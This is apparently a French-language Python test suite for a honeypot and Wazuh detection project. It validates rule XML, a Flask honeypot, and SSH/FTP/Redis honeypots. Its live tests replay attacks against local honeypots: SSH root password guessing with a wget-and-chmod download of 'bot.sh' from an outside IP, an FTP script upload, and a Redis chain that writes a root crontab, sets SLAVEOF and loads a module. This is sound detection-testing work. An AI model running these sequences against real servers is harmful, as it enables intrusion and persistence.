#!/usr/bin/env python3
"""
test_static.py — tests hors-ligne du projet (aucune VM nécessaire).

  python3 tests/test_static.py            # depuis la racine du projet
  python3 tests/test_static.py --no-app   # sans lancer l'appli Flask

Vérifie :
  1. syntaxe des scripts bash (bash -n, + shellcheck si présent)
  2. XML des décodeurs/règles + cohérence wazuh/manager/ <-> deploy/srv01.sh
  3. IDs de règles uniques, parents (if_sid) existants, clés auditd cohérentes
  4. app.py compile + installé par nix01.sh depuis honeypots/web-sweetbuzz/
  5. appli lancée pour de vrai : chaque attaque de cases.tsv produit la bonne
     ligne HONEYPOT-ACCESS, le décodeur la parse, la règle attendue matche
  6. contrôles sécu (falsification IP via X-Forwarded-For, secrets en dur)
  7. règles SSH/FTP/Redis : chaque événement de tests/hp_cases.tsv -> règle attendue
  8. honeypots SSH/FTP/Redis lancés pour de vrai, attaqués, logs JSON vérifiés
     (needs: pip install flask==3.0.2 paramiko)
"""
import hashlib
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CASES = os.path.join(ROOT, "tests", "cases.tsv")
SRV01, NIX01 = "deploy/srv01.sh", "deploy/nix01.sh"
WEBAPP = "honeypots/web-sweetbuzz"
DECODERS, RULES = "wazuh/manager/honeypot_decoders.xml", "wazuh/manager/honeypot_rules.xml"
SVC_RULES = "wazuh/manager/honeypot_services_rules.xml"
HP_CASES = os.path.join(ROOT, "tests", "hp_cases.tsv")
BUILTIN_PARENTS = {"80700", "550", "554", "86600"}  # règles Wazuh natives (auditd, syscheck, json/suricata)

G, R, Y, B, N = "\033[32m", "\033[31m", "\033[33m", "\033[1m", "\033[0m"
stats = {"ok": 0, "fail": 0, "warn": 0}


def ok(m):
    stats["ok"] += 1
    print(f"  {G}[OK]{N}   {m}")


def fail(m):
    stats["fail"] += 1
    print(f"  {R}[FAIL]{N} {m}")


def warn(m):
    stats["warn"] += 1
    print(f"  {Y}[WARN]{N} {m}")


def section(t):
    print(f"\n{B}== {t} =={N}")


def read(p):
    with open(os.path.join(ROOT, p), encoding="utf-8") as f:
        return f.read()


def heredoc(script, start_marker, end="XML"):
    """Extrait le contenu d'un heredoc d'un script bash à partir d'une ligne repère."""
    lines = read(script).splitlines()
    out, inside = [], False
    for ln in lines:
        if not inside and start_marker in ln:
            inside = True
            continue
        if inside:
            if ln.strip() == end:
                break
            out.append(ln)
    return "\n".join(out)


def parse_xml_fragment(txt, label):
    try:
        return ET.fromstring(f"<root>{txt}</root>")
    except ET.ParseError as e:
        fail(f"{label}: XML invalide ({e})")
        return None


def strip_comments(txt):
    return re.sub(r"<!--.*?-->", "", txt, flags=re.S).strip()


def load_cases():
    cases = []
    with open(CASES, encoding="utf-8") as f:
        for ln in f:
            if not ln.strip() or ln.startswith("#"):
                continue
            name, exp, method, path, data, ua, logline = ln.rstrip("\n").split("\t")
            cases.append(dict(name=name, expected=exp, method=method, path=path,
                              data=None if data == "-" else data, ua=ua, logline=logline))
    return cases


# --------------------------------------------------------------------------- 1
def t_bash():
    section("1. Scripts bash")
    scripts = [SRV01, NIX01, "deploy/vagrant/provision.sh", f"{WEBAPP}/deploy.sh",
               "tests/test_nix01.sh", "tests/test_srv01.sh", "deploy/honeypots.sh"]
    has_sc = shutil.which("shellcheck")
    for s in scripts:
        p = os.path.join(ROOT, s)
        if not os.path.exists(p):
            warn(f"{s} absent")
            continue
        r = subprocess.run(["bash", "-n", p], capture_output=True, text=True)
        ok(f"bash -n {s}") if r.returncode == 0 else fail(f"bash -n {s}: {r.stderr.strip()}")
        if has_sc:
            r = subprocess.run(["shellcheck", "-S", "error", p], capture_output=True, text=True)
            ok(f"shellcheck {s}") if r.returncode == 0 else fail(f"shellcheck {s}:\n{r.stdout[:800]}")
    if not has_sc:
        warn("shellcheck non installé (apt install shellcheck) — vérif avancée sautée")


# --------------------------------------------------------------------------- 2/3
def t_rules():
    section("2. Décodeur + règles Wazuh (XML)")
    dec_txt = read(DECODERS)
    rules_txt = read(RULES)
    dec = parse_xml_fragment(dec_txt, "decoders")
    rules = parse_xml_fragment(rules_txt, "rules")
    if dec is not None:
        ok("manager-honeypot_decoders.xml bien formé")
    if rules is not None:
        ok("manager-honeypot_rules.xml bien formé")

    # cohérence avec ce que srv01.sh déploie réellement
    emb_dec = heredoc(SRV01, 'cat > "$DECODER"')
    emb_rules = heredoc(SRV01, 'cat > "$RULES"')
    if strip_comments(emb_dec) == strip_comments(dec_txt):
        ok("décodeur déployé par srv01.sh == wazuh/manager/honeypot_decoders.xml")
    else:
        fail("décodeur de srv01.sh != wazuh/manager/ (deux versions divergentes)")
    if strip_comments(emb_rules) == strip_comments(rules_txt):
        ok("règles déployées par srv01.sh == wazuh/manager/honeypot_rules.xml")
    else:
        fail("règles de srv01.sh != wazuh/manager/ (deux versions divergentes)")

    svc_txt = read(SVC_RULES)
    svc = parse_xml_fragment(svc_txt, "services rules")
    if svc is not None:
        ok("honeypot_services_rules.xml bien formé")
    if strip_comments(heredoc(SRV01, 'cat > "$SVC_RULES"')) == strip_comments(svc_txt):
        ok("règles SSH/FTP/Redis déployées par srv01.sh == wazuh/manager/honeypot_services_rules.xml")
    else:
        fail("règles SSH/FTP/Redis de srv01.sh != wazuh/manager/honeypot_services_rules.xml")

    if rules is None or dec is None or svc is None:
        return None, None
    global SVC
    SVC = svc
    allr = ET.fromstring(f"<root>{rules_txt}{svc_txt}</root>")

    section("3. Cohérence des règles")
    ids = [r.get("id") for r in allr.iter("rule")]
    dups = {i for i in ids if ids.count(i) > 1}
    ok(f"{len(ids)} règles, IDs uniques") if not dups else fail(f"IDs dupliqués: {dups}")
    bad = [i for i in ids if not (100000 <= int(i) <= 120000)]
    ok("IDs dans la plage locale 100000-120000") if not bad else fail(f"IDs hors plage: {bad}")

    known = set(ids) | BUILTIN_PARENTS
    for r in allr.iter("rule"):
        for tag in ("if_sid", "if_matched_sid"):
            e = r.find(tag)
            if e is not None:
                for parent in re.split(r"[,\s]+", e.text.strip()):
                    if parent not in known:
                        fail(f"règle {r.get('id')}: parent {tag}={parent} inconnu")
    ok("tous les parents if_sid/if_matched_sid existent")

    # clés auditd : règles <-> nix01.sh
    audit_block = heredoc(NIX01, "<<'AUDIT'", end="AUDIT")
    keys_audit = set(re.findall(r"-k\s+(hp_\w+)", audit_block))
    keys_rules = set()
    for r in rules.iter("rule"):
        f = r.find("field[@name='audit.key']")
        if f is not None:
            keys_rules |= set(re.findall(r"hp_\w+", f.text))
    missing_rule = keys_audit - keys_rules
    missing_audit = keys_rules - keys_audit
    ok(f"{len(keys_audit)} clés auditd toutes couvertes par une règle") if not missing_rule \
        else fail(f"clés auditd sans règle: {sorted(missing_rule)}")
    if missing_audit:
        fail(f"règles qui attendent une clé jamais posée par auditd: {sorted(missing_audit)}")

    # champ srcip : nécessaire pour <same_source_ip/> (règle 100191)
    order = (dec.find(".//order").text or "")
    if "srcip" not in order and any(r.find("same_source_ip") is not None for r in rules.iter("rule")):
        warn("le décodeur extrait 'hpsrc' et pas 'srcip' : <same_source_ip/> (règle 100191, brute force) "
             "risque de ne jamais se déclencher -> renommer hpsrc en srcip dans <order>")
    return dec, rules


# --------------------------------------------------------------------------- 4
def t_app_code():
    section("4. Code de l'appli")
    p = os.path.join(ROOT, WEBAPP, "app.py")
    r = subprocess.run([sys.executable, "-m", "py_compile", p], capture_output=True, text=True)
    ok("app.py compile") if r.returncode == 0 else fail(f"app.py ne compile pas: {r.stderr}")

    nix = read(NIX01)
    if "<<'PYEOF'" in nix:
        fail("deploy/nix01.sh embarque encore une copie de app.py (heredoc PYEOF)")
    elif "honeypots/web-sweetbuzz/app.py" in nix:
        ok("deploy/nix01.sh installe honeypots/web-sweetbuzz/app.py (source unique)")
    else:
        fail("deploy/nix01.sh n'installe pas honeypots/web-sweetbuzz/app.py")

    src = read(f"{WEBAPP}/app.py") + read(NIX01) + read(SRV01)
    for pat, msg in [(r"secret_key\s*=\s*['\"]", "secret_key Flask en dur dans app.py"),
                     (r"P@ssword", "mot de passe 'P@ssword' présent dans le code/scripts"),
                     (r"debug\s*=\s*True", "Flask lancé en debug=True")]:
        if re.search(pat, src):
            warn(msg)


# --------------------------------------------------------------------------- 5
def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def http(base, method, path, data=None, ua="curl/8.5.0", headers=None):
    req = urllib.request.Request(base + path, method=method,
                                 data=data.encode() if data else None,
                                 headers={"User-Agent": ua, **(headers or {})})
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    try:
        return opener.open(req, timeout=5).status
    except urllib.error.HTTPError as e:
        return e.code


def predict_rule(rules, fields):
    """Prédiction indicative : 1re règle enfant de 100100 qui matche (ordre du fichier)."""
    for r in rules.iter("rule"):
        sid = r.find("if_sid")
        if sid is None or sid.text.strip() != "100100":
            continue
        f = r.find("field")
        if f is None:
            return r.get("id")
        val = fields.get(f.get("name"), "")
        try:
            if re.search(f.text, val):
                return r.get("id")
        except re.error:
            pass
    return "100100"


def t_app_live(dec, rules):
    section("5. Appli lancée + attaques de cases.tsv")
    try:
        import flask  # noqa: F401
    except ImportError:
        warn("Flask absent -> `pip install flask==3.0.2` pour activer ce test")
        return
    tmp = tempfile.mkdtemp(prefix="hp_static_")
    shutil.copy(os.path.join(ROOT, WEBAPP, "app.py"), tmp)
    port = free_port()
    code = ("import sys;sys.path.insert(0,'.');import app;app.init_db();"
            f"app.app.run(host='127.0.0.1',port={port})")
    proc = subprocess.Popen([sys.executable, "-c", code], cwd=tmp,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    base = f"http://127.0.0.1:{port}"
    try:
        for _ in range(50):
            try:
                http(base, "GET", "/")
                break
            except Exception:  # noqa: BLE001
                time.sleep(0.1)
        else:
            fail("l'appli ne démarre pas")
            return
        ok(f"appli démarrée sur {base}")
        logf = os.path.join(tmp, "logs", "access.log")
        open(logf, "w").close()  # on repart d'un log vide (la sonde de démarrage est ignorée)

        dec_re = None
        if dec is not None:
            pre = dec.find(".//prematch").text
            rx = dec.find(".//regex").text
            fields = dec.find(".//order").text.split(",")
            dec_re = (pre, re.compile(rx), fields)

        for c in load_cases():
            n_before = sum(1 for _ in open(logf))
            http(base, c["method"], c["path"], c["data"], c["ua"])
            time.sleep(0.05)
            lines = open(logf).read().splitlines()
            if len(lines) <= n_before:
                fail(f"{c['name']}: aucune ligne écrite dans access.log")
                continue
            got = lines[-1]
            got_n = re.sub(r"src=\S+", "src=X", got)
            exp_n = re.sub(r"src=\S+", "src=X", c["logline"])
            if got_n != exp_n:
                fail(f"{c['name']}: ligne inattendue\n         attendu: {exp_n}\n         obtenu : {got_n}")
                continue
            if dec_re:
                pre, rx, names = dec_re
                m = rx.search(got) if got.startswith(pre) else None
                if not m:
                    fail(f"{c['name']}: le décodeur hp-access ne parse pas la ligne")
                    continue
                fv = dict(zip(names, m.groups()))
                pred = predict_rule(rules, fv)
                if pred == c["expected"]:
                    ok(f"{c['name']:<18} log OK, décodé, règle {pred} (prédiction)")
                else:
                    warn(f"{c['name']:<18} log OK mais prédiction règle {pred} != attendu {c['expected']} "
                         f"(à confirmer avec wazuh-logtest sur SRV01)")

        section("6. Contrôles sécurité")
        n_before = sum(1 for _ in open(logf))
        http(base, "GET", "/", headers={"X-Forwarded-For": "6.6.6.6"})
        time.sleep(0.05)
        last = open(logf).read().splitlines()[n_before:]
        if last and " src=6.6.6.6 " in last[-1]:
            warn("IP falsifiable : un header X-Forwarded-For forgé remplace l'IP source dans les logs "
                 "(utiliser request.remote_addr)")
        else:
            ok("IP source non falsifiable via X-Forwarded-For")
        if os.path.exists(logf + ".err") and os.path.getsize(logf + ".err"):
            fail(f"erreurs du hook de log: {open(logf + '.err').read()[:300]}")
        else:
            ok("aucune erreur du hook de log (access.log.err vide)")
    finally:
        proc.terminate()
        proc.wait(timeout=5)
        shutil.rmtree(tmp, ignore_errors=True)


# --------------------------------------------------------------------------- 7/8 honeypots JSON
SVC = None


def hp_value(v):
    if isinstance(v, bool):  # le décodeur json de Wazuh rend true/false en texte
        return "true" if v else "false"
    return "" if v is None else str(v)


def hp_predict(svc, event):
    """Prédiction : descend l'arbre if_sid depuis 100399/100400 en prenant le 1er enfant qui matche."""
    rules = list(svc.iter("rule"))
    base = {"100399", "100400"}

    def match(r):
        if r.get("frequency") or r.find("if_matched_sid") is not None:
            return False
        for f in r.findall("field"):
            v = event.get(f.get("name"))
            if v is None or not re.search(f.text, hp_value(v)):
                return False
        return True

    root = next(r for r in rules if r.get("id") == "100400")
    if not match(root):
        return None
    cur = base
    found = "100400"
    while True:
        nxt = None
        for r in rules:
            e = r.find("if_sid")
            if e is not None and set(re.split(r"[,\s]+", e.text.strip())) & cur and r.get("id") not in base and match(r):
                nxt = r.get("id")
                break
        if not nxt:
            return found
        found, cur = nxt, {nxt}


def load_hp_cases():
    out = []
    with open(HP_CASES, encoding="utf-8") as f:
        for ln in f:
            if ln.strip() and not ln.startswith("#"):
                name, exp, js = ln.rstrip("\n").split("\t")
                out.append((name, exp, js))
    return out


def t_hp_rules():
    section("7. Règles SSH/FTP/Redis (prédiction sur tests/hp_cases.tsv)")
    if SVC is None:
        fail("règles des honeypots non chargées")
        return
    for name, exp, js in load_hp_cases():
        try:
            ev = json.loads(js)
        except ValueError as e:
            fail(f"{name}: JSON invalide ({e})")
            continue
        got = hp_predict(SVC, ev)
        ok(f"{name:<22} -> {got}") if got == exp else fail(f"{name:<22} -> {got} (attendu {exp})")
    # chaque règle (hors corrélations) est couverte par au moins un cas
    covered = {exp for _, exp, _ in load_hp_cases()}
    for r in SVC.iter("rule"):
        rid = r.get("id")
        if rid not in ("100399", "100400") and not r.get("frequency") and r.find("if_matched_sid") is None \
                and rid not in covered:
            warn(f"règle {rid} sans cas de test dans hp_cases.tsv")


REQUIRED = ("timestamp", "honeypot", "event_type", "srcip", "src_port", "session")


def wait_port(port, timeout=8):
    end = time.time() + timeout
    while time.time() < end:
        try:
            socket.create_connection(("127.0.0.1", port), 0.5).close()
            return True
        except OSError:
            time.sleep(0.1)
    return False


def attack_ssh(port):
    import paramiko
    for pw in ("toor1", "admin", "qwerty"):
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect("127.0.0.1", port, username="root", password=pw, look_for_keys=False, allow_agent=False, timeout=5)
        except paramiko.AuthenticationException:
            pass
        finally:
            c.close()
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect("127.0.0.1", port, username="root", password="123456", look_for_keys=False, allow_agent=False, timeout=5)
    _, o, _ = c.exec_command("uname -a")
    o.read()
    ch = c.invoke_shell()
    ch.send("wget http://198.51.100.7/bot.sh -O /tmp/bot.sh\rchmod +x /tmp/bot.sh\rexit\r")
    end = time.time() + 5
    while not ch.exit_status_ready() and time.time() < end:
        time.sleep(0.1)
    c.close()


def attack_ftp(port):
    import ftplib
    import io
    f = ftplib.FTP()
    f.connect("127.0.0.1", port, timeout=5)
    try:
        f.login("admin", "wrongpass")
    except ftplib.error_perm:
        pass
    f.close()
    f = ftplib.FTP()
    f.connect("127.0.0.1", port, timeout=5)
    f.login("admin", "admin")
    f.cwd("backup")
    f.retrbinary("RETR config.php.bak", lambda b: None)
    f.storbinary("STOR x.sh", io.BytesIO(b"#!/bin/sh\necho pwned\n"))
    f.quit()


def attack_redis(port):
    def resp(*a):
        return b"*%d\r\n" % len(a) + b"".join(b"$%d\r\n%s\r\n" % (len(x.encode()), x.encode()) for x in a)
    s = socket.create_connection(("127.0.0.1", port), 5)
    for cmd in (("AUTH", "foobared"), ("CONFIG", "SET", "dir", "/var/spool/cron/crontabs"),
                ("CONFIG", "SET", "dbfilename", "root"), ("SAVE",), ("SLAVEOF", "198.51.100.7", "21000"),
                ("MODULE", "LOAD", "/tmp/exp.so"), ("QUIT",)):
        s.sendall(resp(*cmd))
        s.recv(65536)
    s.close()


def t_hp_live():
    section("8. Honeypots SSH/FTP/Redis lancés + attaques")
    tmp = tempfile.mkdtemp(prefix="hp_svc_")
    logdir = os.path.join(tmp, "log")
    pasv = free_port()
    specs = {
        "ssh": ("honeypots/ssh/ssh_honeypot.py", "HP_SSH", attack_ssh, {"100402", "100404", "100423", "100421", "100422"}),
        "ftp": ("honeypots/ftp/ftp_honeypot.py", "HP_FTP", attack_ftp, {"100402", "100404", "100432", "100431"}),
        "redis": ("honeypots/redis/redis_honeypot.py", "HP_REDIS", attack_redis, {"100402", "100440", "100445", "100441", "100442"}),
    }
    procs = []
    try:
        for hp, (script, pfx, attack, expected) in specs.items():
            if hp == "ssh":
                try:
                    import paramiko  # noqa: F401
                except ImportError:
                    warn("paramiko absent -> `pip install paramiko` pour tester le honeypot SSH")
                    continue
            port = free_port()
            env = dict(os.environ, HP_LOG_DIR=logdir, HP_DATA_DIR=os.path.join(tmp, "data"),
                       **{f"{pfx}_PORT": str(port), f"{pfx}_BIND": "127.0.0.1"},
                       HP_FTP_PASV_MIN=str(pasv), HP_FTP_PASV_MAX=str(pasv))
            p = subprocess.Popen([sys.executable, os.path.join(ROOT, script)], env=env,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            procs.append(p)
            if not wait_port(port):
                fail(f"{hp}: ne démarre pas ({p.stderr.read(500) if p.poll() is not None else 'timeout'})")
                continue
            ok(f"{hp}: démarré sur 127.0.0.1:{port}")
            try:
                attack(port)
            except Exception as e:  # noqa: BLE001
                fail(f"{hp}: attaque de test en erreur: {type(e).__name__}: {e}")
            time.sleep(0.5)
            path = os.path.join(logdir, f"{hp}.json")
            if not os.path.exists(path):
                fail(f"{hp}: aucun log {path}")
                continue
            events, bad = [], 0
            for ln in open(path, encoding="ascii"):
                try:
                    events.append(json.loads(ln))
                except ValueError:
                    bad += 1
            ok(f"{hp}: {len(events)} événements JSON valides") if events and not bad \
                else fail(f"{hp}: {bad} lignes JSON invalides / {len(events)} valides")
            missing = [k for e in events for k in REQUIRED if k not in e]
            ok(f"{hp}: champs obligatoires présents ({', '.join(REQUIRED)})") if not missing \
                else fail(f"{hp}: champs manquants: {sorted(set(missing))}")
            if any(e.get("srcip") != "127.0.0.1" for e in events):
                fail(f"{hp}: srcip incorrect dans certains événements")
            if any(e.get("event_type") == "login_attempt" and "password" not in e for e in events):
                fail(f"{hp}: login_attempt sans mot de passe")
            got = {hp_predict(SVC, e) for e in events} if SVC is not None else set()
            miss = expected - got
            ok(f"{hp}: règles déclenchées (prédiction) {sorted(expected)}") if not miss \
                else fail(f"{hp}: règles attendues non déclenchées: {sorted(miss)} (obtenu {sorted(x for x in got if x)})")
            if hp == "ftp":
                up = os.path.join(tmp, "data", "ftp_uploads")
                ev = [e for e in events if e.get("event_type") == "file_upload"]
                if ev and os.path.exists(os.path.join(up, ev[0]["sha256"])):
                    data = open(os.path.join(up, ev[0]["sha256"]), "rb").read()
                    ok("ftp: fichier déposé conservé, sha256 vérifié") if hashlib.sha256(data).hexdigest() == ev[0]["sha256"] \
                        else fail("ftp: sha256 du fichier conservé incorrect")
                else:
                    fail("ftp: fichier déposé non conservé")
    finally:
        for p in procs:
            p.terminate()
            try:
                p.wait(timeout=5)
            except subprocess.TimeoutExpired:
                p.kill()
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    print(f"{B}Projet: {ROOT}{N}")
    t_bash()
    dec, rules = t_rules()
    t_app_code()
    if "--no-app" not in sys.argv:
        t_app_live(dec, rules)
    t_hp_rules()
    if "--no-app" not in sys.argv:
        t_hp_live()
    print(f"\n{B}Résultat:{N} {G}{stats['ok']} OK{N}, {Y}{stats['warn']} WARN{N}, {R}{stats['fail']} FAIL{N}")
    h = hashlib.sha256(read(RULES).encode()).hexdigest()[:12]
    print(f"(empreinte des règles: {h})")
    sys.exit(1 if stats["fail"] else 0)


if __name__ == "__main__":
    main()
